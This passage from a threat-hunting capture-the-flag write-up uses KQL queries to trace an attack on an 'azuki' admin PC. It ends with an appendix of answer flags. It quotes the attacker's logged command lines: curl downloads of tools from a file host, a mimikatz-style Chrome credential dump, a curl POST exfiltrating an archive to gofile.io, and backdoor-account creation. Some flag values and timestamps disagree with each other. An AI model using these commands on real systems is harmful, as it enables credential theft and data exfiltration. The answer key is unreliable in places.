| project Timestamp, DeviceName, InitiatingProcessAccountName, ActionType, FileName, FolderPath, FileSize, InitiatingProcessCommandLine, SHA256 
| sort by Timestamp asc
```

FolderPath: `C:\Users\yuki.tanaka\AppData\Roaming\Microsoft\Windows\Recent\OLD-Passwords.lnk

**Question:** Identify the discovered password file?
Flag: `OLD-Passwords.lnk`
Timestamp: `2025-11-25T04:15:57.3989346Z

---
### **🚩** FLAG 17: COLLECTION - Data Staging Directory
> Attackers establish staging locations in system directories to organize stolen data before exfiltration. These paths are critical IOCs for forensic investigation.


```KQL
DeviceFileEvents
| where DeviceName contains "azuki"
| where FileName has_any (".zip", ".7z", ".rar", ".tar", ".gz")
| where Timestamp > todatetime('2025-11-25T04:06:52.7572947Z')
| project Timestamp, DeviceName, InitiatingProcessAccountName, ActionType, FileName, FolderPath, FileSize, InitiatingProcessCommandLine, SHA256
| sort by Timestamp asc
```

Looking at initiatingprocesscommandline we see the attacker zipping files in archives
FileName: `Tax-Supporting-Docs-2024.zip`
FolderName: `C:\ProgramData\Microsoft\Crypto\staging\Tax-Records\Tax-Supporting-Docs-2024.zip

**Question:** Identify the data staging directory?
Flag: `C:\ProgramData\Microsoft\Crypto\staging`
Timestamp: `2025-11-25T04:37:33.9829582Z`

---
### **🚩** FLAG 18: COLLECTION - Automated Data Collection Command
> Scriptable file copying technique with retry logic and network optimisation is ideal for bulk data theft operations

```KQL
DeviceProcessEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime('2025-11-25T04:06:52.7572947Z')
| where ProcessCommandLine contains @"C:\ProgramData\Microsoft\Crypto\staging"
| project Timestamp, DeviceName, AccountName, ActionType, FileName, FolderPath, FileSize, ProcessCommandLine, SHA256
| sort by Timestamp asc
```

**Question:** Identify the command used to copy banking documents?
Flag: `"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP
Timestamp: `2025-11-25T04:37:03.**0075513Z`

---
### **🚩** FLAG 19: COLLECTION - Exfiltration Volume
> Quantifying the number of archives created reveals the scope of data theft and helps prioritise impact assessment efforts.


```KQL
DeviceFileEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime('2025-11-25T04:06:52.7572947Z')
| where FileName has_any (".tar", ".gz", ".rar", ".7z")
| project Timestamp, DeviceName, InitiatingProcessAccountName, ActionType, FileName, FolderPath, FileSize, InitiatingProcessCommandLine, SHA256
| sort by Timestamp asc
```

Timestamp:
ArchiveNames:
- `credentials.tar.gz`
- `quickbooks-data.tar.gz`
- `banking-records.tar.gz`
- `tax-documents.tar.gz`
- `contracts-data.tar.gz`
- `chrome-credentials.tar.gz`
- `chrome-session-theft.tar.gz`
- `m-temp.7z` - was downloaded into staging directory using command:
	- `"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z`
- 

**Question:** Identify the total number of archives created?
Flag: `8`
Timestamp: `2025-11-25T04:39:16.4900877Z`

---
### **🚩** FLAG 20: CREDENTIAL ACCESS - Credential Theft Tool Download
> Attackers download specialised credential theft tools directly to compromised systems, adapting their toolkit to the target environment.


```KQL
DeviceProcessEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime('2025-11-25T04:06:52.7572947Z')
| where ProcessCommandLine contains "curl"
| project Timestamp, ActionType, DeviceName, AccountName, ProcessCommandLine, SHA256
| sort by Timestamp asc
```

Timestamp: `2025-11-25T05:55:34.5280119Z`
ProcesssCommandLine: `"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z`

**Question:** What command was used to download the credential theft tool?
Flag: `"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z`
Timestamp: `2025-11-25T05:55:34.5280119Z`

---
### **🚩** FLAG 21: CREDENTIAL ACCESS - Browser Credential Theft
> Modern credential theft targets browser password stores, extracting saved credentials without triggering LSASS-focused detections.


```KQL
DeviceProcessEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime('2025-11-25T04:06:52.7572947Z')
| where ProcessCommandLine contains "chrome"
| where ProcessCommandLine !contains "msedgewebview2.exe"
| project Timestamp, ActionType, DeviceName, AccountName, ProcessCommandLine
| sort by Timestamp asc
```

Based on the files that were exfiltrated, the attacker was able to take chrome credentials. We can look for command lines that contain chrome. 

Timestamp: `2025-11-25T05:55:54.858525Z`
ProcessCommandLine: `"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit`

**Question**: What command was used for browser credential theft?
Flag: `"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit`
Timestamp: `2025-11-25T05:55:54.858525Z`


---
### **🚩** FLAG 22: EXFILTRATION - Data Upload Command
> Form-based HTTP uploads provide simple, reliable data exfiltration that blends with legitimate web traffic and supports large file transfers.

```KQL
DeviceProcessEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime('2025-11-25T04:06:52.7572947Z')
| where ProcessCommandLine contains "POST"
| project Timestamp, ActionType, DeviceName, AccountName, ProcessCommandLine
| sort by Timestamp asc
```

Timestamp: `2025-11-25T04:41:51.7723427Z`
ProcessCommandLine: `"curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile`

**Question:** Identify the command used to exfiltrate the first archive?
Flag: `"curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile`
Timestamp: 

---
### **🚩** FLAG 23: EXFILTRATION - Cloud Storage Service
> Anonymous file sharing services provide temporary storage with self-destructing links, complicating data recovery and attribution.

**Question**: Identify the exfiltration service domain?
Flag: `gofile.io`
Timestamp: `2025-11-25T04:41:51.7723427Z`


---
### **🚩** FLAG 24: EXFILTRATION - Destination Server
> IP addresses enable network-layer blocking and threat intelligence correlation when domain-based controls fail or are bypassed.


```KQL
DeviceNetworkEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime('2025-11-25T04:06:52.7572947Z')
| where InitiatingProcessCommandLine contains "POST"
| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine, LocalIP, LocalPort, RemoteIP, RemotePort, RemoteUrl
| sort by Timestamp asc
```

**Question:** Identify the exfiltration server IP address?
Flag: `45.112.123.227`
Timestamp: `2025-11-25T04:41:52.2330729Z

---
### 🚩 FLAG 25: CREDENTIAL ACCESS - Master Password Extraction
> Password managers store credentials for multiple systems. Extracting the master password provides access to all stored secrets.


```KQL
DeviceFileEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime('2025-11-25T04:06:52.7572947Z')
| where InitiatingProcessCommandLine contains "password"
| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FolderPath, InitiatingProcessCommandLine, SHA256
| sort by Timestamp asc
```

Timestamp: `2025-11-25T04:39:16.4900877Z`
Credential Files Archived: 
- `Azuki-Passwords.kdbx`
- `KeePass-Master-Password.txt`

**Question:** What file contains the extracted master password?
Flag: `KeePass-Master-Password.txt`
Timestamp: `2025-11-25T04:39:16.4900877Z`

## Appendix D: CTF Flags

|                            **Objective**                             |                                                         **Flag**                                                         |        **Time (UTC)**        |
| :------------------------------------------------------------------: | :----------------------------------------------------------------------------------------------------------------------: | :--------------------------: |
| Identify the source IP address for lateral movement to the admin PC  |                                                       `10.1.0.204`                                                       | 2025-11-25T04:06:52.7572947Z |
|      Identify the compromised account used for lateral movement      |                                                      `yuki.tanaka`                                                       | 2025-11-25T04:06:52.7572947Z |
|                   What is the target device name?                    |                                                     `azuki-adminpc`                                                      | 2025-11-25T04:06:52.7572947Z |
|         What file hosting service was used to stage malware?         |                                                   `litter.catbox.moe`                                                    | 2025-11-25T04:21:13.0441744Z |
|       What command was used to download the malicious archive?       |              `"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z`               | 2025-11-25T04:21:13.0441744Z |
| Identify the command used to extract the password-protected archive? |                `7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y`                 | 2025-11-25T04:21:33.1155477Z |
|                   Identify the C2 beacon filename?                   |                                                    `meterpreter.exe`                                                     | 2025-11-25T04:21:33.118662Z  |
|          Identify the named pipe created by the C2 implant           |                                            `\Device\NamedPipe\msf-pipe-5902`                                             | 2025-11-25T04:24:35.3398583Z |
|                 What is the decoded Base64 command?                  |                                        `net user yuki.tanaka2 B@ckd00r2024! /add`                                        | 2025-11-25T04:51:08.9068069Z |
|                 Identify the backdoor account name?                  |                                                      `yuki.tanaka2`                                                      | 2025-11-25T04:51:08.9068069Z |
|     What is the decoded Base64 command for privilege escalation?     |                                    `net localgroup Administrators yuki.tanaka2 /add`                                     | 2025-11-25T04:51:23.1513024Z |
|           What command was used to enumerate RDP sessions?           |                                                        `qwinsta`                                                         | 2025-11-25T04:08:58.5854766Z |
|        Identify the command used to enumerate domain trusts?         |                                        `"nltest.exe" /domain_trusts /all_trusts`                                         | 2025-11-25T04:09:25.4429368Z |
|       What command was used to enumerate network connections?        |                                                   `"NETSTAT.EXE" -ano`                                                   | 2025-11-25T04:10:07.805432Z  |
|       What command was used to search for password databases?        |                                         `"cmd.exe" /c where /r C:\Users *.kdbx`                                          | 2025-11-25T04:13:45.8171756Z |
|                Identify the discovered password file?                |                                                   `OLD-Passwords.txt`                                                    | 2025-11-25T04:15:57.3989346Z |
|                 Identify the data staging directory?                 |                                        `C:\ProgramData\Microsoft\Crypto\staging`                                         | 2025-11-25T04:37:33.9829582Z |
|         Identify the command used to copy banking documents?         | `"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP` | 2025-11-25T04:37:03.0075513Z |
|            Identify the total number of archives created?            |                                                           `8`                                                            |                              |
|     What command was used to download the credential theft tool?     |                             `"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z`                             | 2025-11-25T05:55:34.5280119Z |
|         What command was used for browser credential theft?          | `"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit` | 2025-11-25T05:55:54.858525Z  |
|      Identify the command used to exfiltrate the first archive?      |                   `"curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile`                   | 2025-11-25T04:41:51.7723427Z |
|              Identify the exfiltration service domain?               |                                                       `gofile.io`                                                        | 2025-11-25T04:41:51.7723427Z |
|             Identify the exfiltration server IP address?             |                                                     `45.112.123.227`                                                     | 2025-11-25T04:41:52.2330729Z |
|          What file contains the extracted master password?           |                                              `KeePass-Master-Password.txt`                                               | 2025-11-25T04:39:16.4900877Z |
